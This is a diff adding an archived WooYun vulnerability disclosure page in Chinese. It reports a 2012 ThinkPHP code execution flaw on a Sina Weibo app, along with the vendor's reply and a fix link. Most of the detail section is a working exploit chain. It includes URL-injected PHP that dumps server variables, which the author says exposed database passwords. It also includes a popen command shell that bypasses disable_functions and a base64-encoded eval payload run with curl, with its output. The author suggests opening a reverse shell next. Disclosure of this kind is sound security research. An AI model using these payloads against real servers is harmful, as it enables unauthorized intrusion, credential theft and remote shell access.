@@ -1,0 +1,244 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博任意代码执行漏洞+突破限制拿shell+可能深入其他动作  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博任意代码执行漏洞+突破限制拿shell+可能深入其他动作  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/牛奶坦克">牛奶坦克</a> 
+</li><li>提交时间：		2012-04-13 15:29</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-04-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-04-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-04-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-05-03：	细节向普通白帽子公开<br/>
+									2012-05-13：	细节向实习白帽子公开<br/>
+									2012-05-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">新浪微博存在一处任意代码执行漏洞，但服务器有些disable_function限制，可惜太粗糙，导致绕过，反弹服务器shell，并可进一步渗透攻击。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">Thinkphp的补丁被wooyun平台分析后，自己也读了一把，对漏洞发现者甚是膜拜，同时wofeiwo的出色分析也让人精神为之一爽，顿时湿了。<br />
+<br />
+<br />
+<br />
+这个漏洞因为工作原因跟的慢了一些，去官方成功案例看了一下，没想到看到新浪微博一个应用用了这个框架，看了一把，确实存在哟。<br />
+<br />
+<br />
+<br />
+http://tan.weibo.com/h/1/236/aaa/$%7B@print_r($_SERVER)%7D<br />
+<br />
+<br />
+<br />
+读取到了服务器的$_SERVER变量，里面甚至还存在数据库地址与密码。。<br />
+<br />
+<br />
+<br />
+本想执行个命令就提交wooyun，但是disable_functions了<br />
+<br />
+</p><pre><code>http://tan.weibo.com/h/1/236/aaa/$%7B@print(get_cfg_var(&#039;disable_functions&#039;))%7D</code></pre><p class='detail'><br />
+<br />
+返回：<br />
+<br />
+</p><pre><code>phpinfo,system,exec,shell_exec,passthru,proc_open,proc_close,show_source</code></pre><p class='detail'><br />
+<br />
+呵呵，弱了点，突破方法很多，这里用popen做个exploit<br />
+<br />
+</p><pre><code>error_reporting(E_ALL);$handle = popen(&#039;/bin/sh -c &#039;.&quot;&#039;$_POST[x]&#039;&quot;.&#039; 2&gt;&amp;1&#039;, &#039;r&#039;);echo &quot;&#039;$handle&#039;; &quot; . gettype($handle) . &quot;\n&quot;;$read = fread($handle, 2096);echo $read;pclose($handle);die();</code></pre><p class='detail'><br />
+<br />
+为什么用POST是因为框架的URI取值问题，POST就畅通无阻了<br />
+<br />
+<br />
+<br />
+这个地方没处理单引号，方便了一些，但是poc里面的某些代码会干扰取值，所以encode一下<br />
+<br />
+</p><pre><code>curl &quot;http://tan.weibo.com/h/1/236/aaa/$%7B@eval(base64_decode(&#039;ZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTskaGFuZGxlID0gcG9wZW4oJy9iaW4vc2ggLWMgJy4iJyRfUE9TVFt4XSciLicgMj4mMScsICdyJyk7ZWNobyAiJyRoYW5kbGUnOyAiIC4gZ2V0dHlwZSgkaGFuZGxlKSAuICJcbiI7JHJlYWQgPSBmcmVhZCgkaGFuZGxlLCAyMDk2KTtlY2hvICRyZWFkO3BjbG9zZSgkaGFuZGxlKTtkaWUoKTs&#039;))%7D&quot; -d &quot;x=ls&quot;<br />
+&#039;Resource id #33&#039;; resource<br />
+Api<br />
+Conf<br />
+Data<br />
+Lib<br />
+Public<br />
+ThinkPHP<br />
+Tpl<br />
+api.php<br />
+co.php<br />
+db<br />
+favicon.ico<br />
+index.php<br />
+oauthcallback.php<br />
+pictureDownLoad.php<br />
+ssocallback.php<br />
+system<br />
+t.php</code></pre><p class='detail'><br />
+<br />
+嘿。<br />
+<br />
+<br />
+<br />
+这个因为访问权限的问题，可以访问到这个服务器上所有的源码。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+因为是服务器群，所以执行的命令可能一会A，一会B，一会C。。这个自己想办法吧，既然可以执行命令了，直接弹shell。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">一些截图：<br />
+<br />
+</p><p class="detail"><a href="../images/13152609c64ad2b84d82cac8b8288d21e4046ed6.png" target="_blank"><img src="../images/13152609c64ad2b84d82cac8b8288d21e4046ed6.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/131526243b8ba2d3052d8255451707df65f2828b.png" target="_blank"><img src="../images/131526243b8ba2d3052d8255451707df65f2828b.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/13152730b79486295e192d9b469a339007cda44a.jpg" target="_blank"><img src="../images/13152730b79486295e192d9b469a339007cda44a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/13152802749f7098bc4e6eaf2641aeb331d477b4.jpg" target="_blank"><img src="../images/13152802749f7098bc4e6eaf2641aeb331d477b4.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复方案：<br />
+<br />
+https://code.google.com/p/thinkphp/source/detail?spec=svn2904&amp;r=2838<br />
+<br />
+<br />
+<br />
+ThinkPHP漏洞分析：<br />
+<br />
+http://zone.wooyun.org/index.php?do=view&amp;id=44 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/牛奶坦克" title="牛奶坦克">牛奶坦克</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-06018" title="新浪微博任意代码执行漏洞+突破限制拿shell+可能深入其他动作">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-04-13 15:55</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供,您所提到的这个问题在您提交WOOYUN之前新浪已在修复,再次感谢您对新浪安全的支持!</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="6018";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
